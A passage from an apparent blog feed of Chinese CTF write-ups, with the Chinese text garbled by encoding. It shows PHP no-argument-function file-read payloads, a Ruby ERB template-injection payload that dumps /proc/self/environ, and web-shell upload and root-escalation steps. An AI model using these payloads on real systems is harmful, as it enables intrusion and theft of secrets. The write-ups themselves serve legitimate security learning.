å€¼è¿”å›å­—ç¬¦ã€‚</span><br><span class="line">hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</span><br><span class="line"></span><br><span class="line">getenv()        è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)</span><br></pre></td></tr></table></figure>
<h2 id="0x06-Reference">0x06 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>URL</th>
</tr>
</thead>
<tbody>
<tr>
<td>ByteCTFä¸€é“é¢˜çš„åˆ†æä¸å­¦ä¹ PHPæ— å‚æ•°å‡½æ•°çš„åˆ©ç”¨</td>
<td><a href="https://threezh1.com/2019/09/15/boringcode/#get-defined-vars-gt-RCE">https://threezh1.com/2019/09/15/boringcode/#get-defined-vars-gt-RCE</a></td>
</tr>
<tr>
<td>å¤ç°ByteCTF-boringcode</td>
<td><a href="https://www.plasf.cn/2019/10/07/ByteCTF-WEB%E5%A4%8D%E7%8E%B0/">https://www.plasf.cn/2019/10/07/ByteCTF-WEBå¤ç°/</a></td>
</tr>
<tr>
<td>PHP Parametric Function RCE</td>
<td><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E5%89%8D%E8%A8%80">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#å‰è¨€</a></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="0x07-Update">0x07 Update</h2>
<p><strong>2020.06.19</strong></p>
<p>å¦‚ä½•åˆ©ç”¨æ— å‚æ•°å‡½æ•°è·³è½¬åˆ°æ ¹ç›®å½•ï¼Œå‡è®¾å½“å‰ç›®å½•æ˜¯<code>/var/www/html</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(dirname(dirname(dirname(getcwd())))))</span><br></pre></td></tr></table></figure>
<p><strong>2020.06.22</strong></p>
<p><code>array_flip</code>å¯ä»¥æ›¿æ¢ä¸º<code>array_reverse</code></p>
<p><code>readfile</code>å¯ä»¥æ›¿æ¢ä¸º<code>show_source</code></p>
<p><strong>2020.07.02</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p><strong>2020.07.13</strong></p>
<p><a href="https://app.yinxiang.com/fx/73cc8928-dad4-4f87-b4d6-0d1e29375ee0">https://app.yinxiang.com/fx/73cc8928-dad4-4f87-b4d6-0d1e29375ee0</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>æ— å‚æ•°å‡½æ•°åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”NodeJS</title>
    <url>/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS/</url>
    <content><![CDATA[<h2 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzNode">GKCTF2020 EZä¸‰å‰‘å®¢-EzNode</h2>
<h2 id="GYCTF2020-Node-Game">GYCTF2020 Node Game</h2>
<h2 id="GKCTF2020-Node-Exe">GKCTF2020 Node-Exe</h2>
<h2 id="GYCTF2020-Ez-Express">GYCTF2020 Ez_Express</h2>
<h2 id="HFCTF2020-EasyLogin">HFCTF2020 EasyLogin</h2>
<h2 id="HFCTF2020-JustEscape">HFCTF2020 JustEscape</h2>
]]></content>
      <categories>
        <category>CTF</category>
        <category>NodeJS</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”RubyåŠGo</title>
    <url>/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo/</url>
    <content><![CDATA[<h2 id="SCTF2019-Flag-Shop">SCTF2019 Flag Shop</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>JWTä¼ªé€ </li>
<li>Ruby SSTI</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<h4 id="è§£æ³•1">è§£æ³•1</h4>
<p>æ‰“å¼€é¶æœºï¼ŒæŸ¥çœ‹æºä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;h1 style=<span class="string">&quot;text-align: center&quot;</span>&gt;Flag Shop&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">Your uid is &lt;b id=<span class="string">&quot;uid&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Your JinKela is &lt;b id=<span class="string">&quot;jkl&quot;</span>&gt;&lt;/b&gt;</span><br><span class="line">&lt;br /&gt;</span><br><span class="line">Flag Price: <span class="xml"><span class="tag">&lt;<span class="name">b</span>&gt;</span>1000000000000000000000000000<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line">&lt;hr /&gt;</span><br><span class="line"></span><br><span class="line">&lt;button onclick=<span class="string">&quot;buyFlag()&quot;</span> style=<span class="string">&quot;text-align: left&quot;</span>&gt;buy flag&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;reset()&quot;</span> style=<span class="string">&quot;text-align: center&quot;</span>&gt;reset&lt;/button&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;work()&quot;</span> style=<span class="string">&quot;text-align: right&quot;</span>&gt;work&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buyFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/shop&quot;</span>, &#123;</span><br><span class="line">            method: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// or &#x27;PUT&#x27;</span></span><br><span class="line">            headers: <span class="keyword">new</span> Headers(&#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">            .then(<span class="function"><span class="params">res</span> =&gt;</span> res.text())</span><br><span class="line"></span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                    alert(response)</span><br><span class="line">                &#125;)</span><br><span class="line"></span><br><span class="line">            .catch(<span class="function"><span class="params">error</span> =&gt;</span>alert(error))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(confirm(<span class="string">&quot;This will reset all Jinkelas , Are U Sure?&quot;</span>))&#123;</span><br><span class="line">            fetch(<span class="string">&quot;/api/auth&quot;</span>);</span><br><span class="line">            <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        fetch(<span class="string">&quot;/work?name=bot&amp;do=bot is working&quot;</span>)</span><br><span class="line">            .then(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fetch(<span class="string">&quot;/api/info&quot;</span>,&#123;</span><br><span class="line">            redirect: <span class="string">&#x27;manual&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(res.ok)&#123;</span><br><span class="line">              <span class="keyword">return</span> res.json()</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">              fetch(<span class="string">&quot;/api/auth&quot;</span>)</span><br><span class="line">              reject;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> info = res;</span><br><span class="line">            <span class="built_in">console</span>.log(info);</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;uid&quot;</span>).innerText = info.uid;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;jkl&quot;</span>).innerText = info.jkl;</span><br><span class="line">        &#125;)</span><br><span class="line">        .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="built_in">window</span>.location.reload(),<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>auth ä¹‹åä¼šå¾—åˆ°ä¸€ä¸ª jwt tokenã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194238.png" alt=""></p>
<p>ç°åœ¨å°±éœ€è¦æ‰¾åˆ°secretã€‚æ‰«æç«™ç‚¹ï¼Œå‘ç°æœ‰filebak</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨workè·¯ç”±</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ° /work é‚£é‡Œæœ‰ ERB æ¨¡æ¿ï¼Œè¿˜ç›´æ¥æŠŠå¯æ§å‚æ•° name æ‹¼è¿›å»äº†ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä¼ å…¥ä¸€äº›æ„é€ è¿‡çš„å‚æ•°ï¼Œæ¥è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„äº†ã€‚ä½†æ˜¯é™åˆ¶äº†payloadçš„é•¿åº¦ä¸º7ã€‚æ¯”å¦‚ <code>name=&lt;%=1%&gt;</code>ï¼Œå°±ä¼šå¾— 1ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815194455.png" alt=""></p>
<p>ä¸€äº›å¸¸è§„çš„SSTIæ³¨å…¥ç”±äºé•¿åº¦çš„é™åˆ¶ï¼Œæœ€å¤šåªèƒ½ç”±ä¸¤ä¸ªå­—ç¬¦ï¼Œè‚¯å®šæ˜¯è¡Œä¸é€šçš„ã€‚</p>
<p>å¯¹ç…§ <a href="https://blog.csdn.net/zdq0394123/article/details/8443694">Ruby å…¨å±€å˜é‡è¡¨</a> ï¼Œä¸æ–­ fuzzï¼Œå‘ç°<code>$</code>æœ‰ä¸œè¥¿</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204424.png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<p>å…¶åœ¨æ¨¡æ¿æ¸²æŸ“ä¹‹å‰ä¹‹å‰æœ‰ä¸ªåŒ¹é…ï¼Œå°±æ˜¯è¿™é‡Œã€‚è¦æ˜¯ SECRET å‚æ•°å­˜åœ¨åˆ™å¯¹å…¶è¿›è¡ŒåŒ¹é…ï¼Œç”¨ä¼ å…¥çš„è¿™ä¸ªå€¼å»å’Œ <code>ENV[&quot;SECRET&quot;]</code> åŒ¹é…ï¼ŒåŒ¹é…ä¸Šäº†å°±å¾€ç»ˆç«¯è¾“å‡º FLAGã€‚ç„¶åæˆ‘ä»¬ SECRET ä¸ä¼ è¯•è¯•ï¼Œè¿™æ ·æ‹¬å·é‡Œçš„åŒ¹é…å°±ä¸è¿›è¡Œï¼Œåªè¿›è¡Œæ‹¬å·å¤–çš„ <code>ENV[&quot;SECRET&quot;]</code> çš„åŒ¹é…ï¼Œå†ç”¨å…¨å±€å˜é‡ <code>$</code> å°±å¯ä»¥è¯»å‡º <code>ENV[&quot;SECRET&quot;]</code> äº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200815204544.png" alt=""></p>
<h4 id="è§£æ³•2">è§£æ³•2</h4>
<p>HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢</p>
<p>å…ˆä»‹ç»ä¸€ä¸ªtrick</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">$a = <span class="string">&quot;qwertyu&quot;</span></span><br><span class="line">$b = Array[<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;d&quot;</span>]</span><br><span class="line">puts <span class="string">&quot;$a: <span class="subst">#&#123;$a[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br><span class="line">puts <span class="string">&quot;$b: <span class="subst">#&#123;$b[<span class="number">0</span>,<span class="number">3</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a: qwe</span><br><span class="line">$b: [&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</span><br></pre></td></tr></table></figure>
<p>$bå˜é‡åŸæœ¬æ˜¯æ•°ç»„ï¼Œä½†æ˜¯ç”±äºè¢«æ‹¼æ¥åˆ°äº†å­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥æ•°ç»„åšäº†ä¸€ä¸ªé»˜è®¤çš„ç±»å‹è½¬æ¢å˜æˆäº†<code>[&quot;bbb&quot;, &quot;cc&quot;, &quot;d&quot;]</code></p>
<p>æœ‰äº†è¿™ä¸ªtrickï¼Œä¸Šé¢ä»£ç [0,7]ä»åŸæœ¬çš„é™åˆ¶7ä¸ªå­—ç¬¦çªç„¶å˜æˆäº†é™åˆ¶7ä¸ªæ•°ç»„é•¿åº¦</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;work?SECRET&#x3D;a&amp;do&#x3D;[&quot;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;] is working&amp;name[]&#x3D;&lt;%&#x3D; File.open(&#39;&#x2F;proc&#x2F;self&#x2F;environ&#39;).read %&gt;&amp;name[]&#x3D;1&amp;name[]&#x3D;2&amp;name[]&#x3D;3&amp;name[]&#x3D;4&amp;name[]&#x3D;5&amp;name[]&#x3D;6</span><br></pre></td></tr></table></figure>
<blockquote>
<p>éœ€è¦å¯¹doå‚æ•°urlencodeç¼–ç </p>
</blockquote>
<h3 id="å‚è€ƒ">å‚è€ƒ</h3>
<p><a href="https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html">https://writeup.ctfhub.com/Challenge/2019/SCTF/34251.html</a></p>
<p><a href="https://evoa.me/archives/15/">https://evoa.me/archives/15/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Rubyå’ŒGo</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”æ¸—é€æµ‹è¯•ç¯‡</title>
    <url>/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87/</url>
    <content><![CDATA[<h1 id="BUUCTFâ€”â€”æ¸—é€æµ‹è¯•ç¯‡">BUUCTFâ€”â€”æ¸—é€æµ‹è¯•ç¯‡</h1>
<h2 id="GKCTF2020-è€å…«å°è¶…å¸‚å„¿">GKCTF2020 è€å…«å°è¶…å¸‚å„¿</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>å¼±å£ä»¤ç™»å½•</li>
<li>shopxo1.8.0 åå°RCE</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>æ²¡å»æƒ³åå°åœ°å€å¼±å¯†ç è¿˜æ˜¯ç»éªŒå¤ªå°‘äº†</p>
<p>ç„¶åå°±æ˜¯çœ‹ä¼ æ–‡ä»¶ç‚¹ï¼Œä¼ ä¸ªshellä¸Šå»</p>
<p>ä½†æ˜¯æ–‡ä»¶å…·ä½“åœ¨å“ªåˆæ‰¾äº†åŠå¤©</p>
<p>å¦‚æœä¼ åœ¨é»˜è®¤ä¸»é¢˜zipçš„<code>default/__static__/shell.php</code></p>
<p>é‚£ä¹ˆè®¿é—®è·¯ç”±åº”è¯¥æ˜¯ä¸‹é¢è¿™æ ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;shell.php</span><br></pre></td></tr></table></figure>
<p>getshellå®Œäº†ï¼Œæ ¹æ®æç¤ºï¼Œå»æ‰¾ç”Ÿæˆçš„è„šæœ¬ï¼ˆå› ä¸ºè¿™ä¸ªè„šæœ¬æ˜¯ç”±rootæƒé™+å®šæ—¶æ‰§è¡Œçš„ï¼‰</p>
<p>æ”¹é€ ä¸‹è¿™ä¸ªè„šæœ¬ï¼Œåå¼¹shellæˆ–è€…ç›´æ¥æ‰§è¡Œcatå‘½ä»¤ï¼Œå°±æ‹¿åˆ°rootæƒé™äº†ã€‚</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704124355.png" style="zoom:50%;" />
<h2 id="BJDCTF-2nd-SchroÌˆdinger">BJDCTF 2nd SchroÌˆdinger</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>å¥‡æ€ªçš„è€ƒç‚¹</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>æ‰“å¼€é¢˜ç›®æœ‰ä¸€ä¸ª<code>test.php</code>ï¼Œæ˜¯ä¸€ä¸ªéœ€è¦ç™»å½•çš„ç½‘é¡µï¼Œçˆ†ç ´çš„targetåº”è¯¥å°±æ˜¯è¿™ä¸ª<code>test.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200704212115.png" alt=""></p>
<p>å¹¶ä¸”Forecast success rateæ˜¯æ ¹æ®JSä»£ç æ¥ç”Ÿæˆçš„ï¼Œå‘ç°çˆ†ç ´å¾ˆæ…¢ï¼ŒæŠ“åŒ…æŸ¥çœ‹å‘ç°æœ‰ä¸ªcookieæ˜¯base64åŠ å¯†ï¼Œè§£ç ä¹‹åå¾ˆåƒæ—¶é—´æˆ³ï¼Œç›´æ¥æ¸…ç©ºçœ‹çœ‹æ•ˆæœï¼Œå‘ç°ç›´æ¥99%ï¼Œç‚¹å‡»checkï¼Œå¼¹å‡ºæ¥Bilibiliçš„AVå·ã€‚</p>
<p>æ ¹æ®æ—¶é—´æŸ¥çœ‹è¯„è®ºå¾—åˆ°flagã€‚</p>
<blockquote>
<p>æˆ‘è¿˜ä»¥ä¸ºè¦å»çœ‹åŒ—äº¬å¤§å­¦ é‡å­åŠ›å­¦çš„è§†é¢‘å‘¢</p>
</blockquote>
<h2 id="V-N-HappyCTFd">V&amp;N HappyCTFd</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>CTFd 1day</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<p>è€ƒå¯Ÿçš„æ˜¯CTFd v2.0.0 â€“ v2.2.2 account takeover</p>
<p>å¯ä»¥ç›´æ¥çœ‹è¿™ç¯‡åˆ†æï¼š<a href="https://www.colabug.com/2020/0204/6940556/amp/">https://www.colabug.com/2020/0204/6940556/amp/</a></p>
<p>åˆ©ç”¨è¿‡ç¨‹ï¼š</p>
<ul>
<li><strong>å…ˆåœ¨buuojæ³¨å†Œä¸ªé‚®ç®±</strong></li>
